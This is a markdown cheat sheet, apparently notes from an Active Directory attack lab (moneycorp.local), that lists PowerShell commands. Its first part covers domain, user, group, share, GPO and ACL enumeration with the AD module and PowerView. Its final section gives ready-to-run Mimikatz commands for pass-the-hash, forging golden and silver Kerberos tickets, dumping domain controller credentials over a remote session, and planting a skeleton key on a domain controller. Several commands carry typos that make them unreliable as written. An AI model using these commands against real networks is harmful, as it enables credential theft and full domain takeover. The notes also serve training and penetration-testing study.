## Using AD Module
https://github.com/samratashok/ADModule

* `Import-Module Microsoft.ActiveDirectory.Management.dll`
* `Import-Module ActiveDirectory.psd1`

### Domain
* `Get-ADDomain`
* `Get-ADDomain -Identity moneycorp.local* `
* `Get-ADDomainController`
* `Get-ADDomainController -Discover -Domain "moneycorp.local"`
* `Get-ADTurst -Filter *`
* `Get-ADTrust -Identity domain.forest.local`
* `Get-ADForest -Identity domain.local`
* `(Get-ADForest).Domains` <-- lists all domains in the forest

### Users and Groups
* `Get-ADUser`
* `Get-ADUser -Identity student`
* `Get-ADUser -Filter "Name -like 'admin*'"| select Name`
* `Get-ADUser -Filter * -Properties * | select -First 1| Get-Member -MemberType *Property | Select Name`
* `Get-ADUser -Filter 'Description -like "*built*"'  -Properties Description | select name, Description`
* `Get-ADGroup -Filter * | select Name`
* `Get-ADGroup -Filter 'Name -like "*admin*"' | select name`
* `Get-ADGroupMember -Identity "Domain Admins" -Recursive`
* `Get-ADPrincipalGroupMembership -Identity student2`
* `Get-ADGroup -Server domaincontrollername -Filter *`

### Computers
* `Get-ADComputer -Filter *`
* `Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | Select Name,OperatingSystem`
* `Get-ADComputer -Filter * -Properties DNSHostName| %{Test-Connection -Count 1 -ComputerName _.DNSHostName}`

### Shares
* `Get-ADComputer -Filter * -Property Name| select name| %{Get-NetShare -ComputerName $_.Name}`

### Access Controls (ACLs)
* `Get-ACL`
* `Get-ACL 'AD:\CN=Administrator,CN=Users,DC=dc.local'`
* List ACLs for Administrator user: `(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dc.local').Access`

## Using PowerView
`Import-Module PowerView.ps1`

### Domain
* `Get-NetDomain`
* `Get-NetDomain -Domain moneycorp.local`
* `Get-DomainPolicy`
* `(Get-DomainPolicy)."system access"`
* `Get-NetDomainController`
* `Get-NetDomainController -Domain moneycorp.local`
* `Get-NetDomainTrust -Domain domain.forest.local`
* `Get-NetForest`
* `Get-NetForestDomain` <-- lists all domains in the forest
* `Get-NetForestTrust`

### Users
* `Get-NetUser`
* `Get-NetUser -Username student`
* `Get-NetUser | select cn`
* `Get-UserProperty -Properties pwdlastset`
* `Get-UserProperty -Properties badpwdcount`
* `Find-UserField -SearchField Description -SearchTerm "built"`

### Computers
* `Get-NetComputer`
* `Get-NetComputer -OperatingSystem "*Server 2016*"`
* `Get-NetComputer -FullData | Select cn,operatingsystem`

### Users and Groups
* `Get-NetGroup 'Domain Admins' -Domain moneycorp.local -FullData`
* `Get-NetGroupMember -GroupName "Domain Admins" -Recurse`
* `Get-netLocalGroup -ComputerName DomainController.domain -ListGroups`
* `Get-Net Loggedon -ComputerName localhost`
* `Get-LoggedOnLocal -ComputerName localhost`  <--- Needs remote registry running on target
* `Get-LastLoggedOn -ComputerName localhost`

### Fileshares
* `invoke-sharefinder -Verbose`
* `Invoke-FileFinder -Verbose`
* `Invoke-ShareFinder -Domain "dollarcorp.moneycorp.local" -ExcludeStandard -ExcludePrint -ExcludeIPC`
* `Get-NetFileServer`

### GPOs
* `Get-NetGPO`
* `Get-NetGPO -ComputerName <computer name>`
* `GPResult.exe /R`  (Windows built-in binary)
* Are you in restricted groups? `Get-NetGPOGroup`
* `Find-GPOComputerAdmin -Computername computer.domain`
* `Find-GPOLocation -UserName student -Verbose`

### OUs
* `Get-NetOU -FullData`
* Grab GPLINK CNAME value and use it below to get more info on GPO applied to this OU: 
* `Get-NetGPO -GPOname '{GPLINK CNANME Value between braces}'`

### Access Controls (ACLs)
* `Get-ObjectACL -SamAccountName student -ResolveGUIDs`
* `Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dc.local" -ResolveGUIDs -Verbose`

#### Find interesting ACLs
* `Invoke-ACLScanner -ResolveGUIDs`

### Check local groups and admin access
* `Invoke-CheckLocalAdminAccess`
* `Find-LocalADminAccess -Verbose`
* `Invoke-EnumerateLocalAdmin -Verbose`
* `Get-NetLocalGroup`

### User Hunting
* `Invoke-userhunter -GroupName "RDPUsers"`

## Mimikatz ##
Launch PowerShell with DA's hash:
* `Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:domainname.domainname.local /ntlm:NTLMHASH /run:powershell.exe"'`

Using NTLM hash of krbtgt account, create a Golden ticket (Get-DomainSID first):
* `invoke-mimikatz -Command '"kerberos::golden /User:Administrator /domain:domainname.domainname.local /sid:DOMAINSIDGOESHERE /krbtgt:KRBTGTHASHGOESHERE id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`

Create a silver ticket for HOST service SPN (Get-DomainSID first) :
* `Invoke-Mimikatz -Command '"kerberos::golden /domain:domainname.domainname.local /sid:DOMAINSIDGOESHERE /target:domaincontrollername.domainname.domainname.local /service:HOST /rc4:NTLMHASHGOESHERE /user:Administrator /ptt"'`

You need HOST service silver ticket to interact with the operating system (e.g. run commands). CIFS service silver ticket will allow you to interact with the file system.

Dump hashes of a Domain Controller:
* `$sess = New-PSSession -Computer-Name dcorp-dc.domainname.domainname.local -Verbose`
* `Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess`
* `Enter-PSSession -Session $sess`
* `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`

"Over pass" Domain admin's hash in an elevated PowerShell window, get a ticket with domain admin's hash, and open new powershell window with DA's ticket
* `Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:domainname.domainname.local /ntlm:NTLMHASHGOESHERE /run:powershell.exe"'`

Dump domain secrets
* `Invoke-Mimikatz -Command '"lsadump::lsa /path"' -ComputerName dcorp.dc`


Create a Sekelton Key (sort-of adds a secondary password of mimikatz to all domain users):
* `Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName domaincontrollername.domainname.domainname.local`
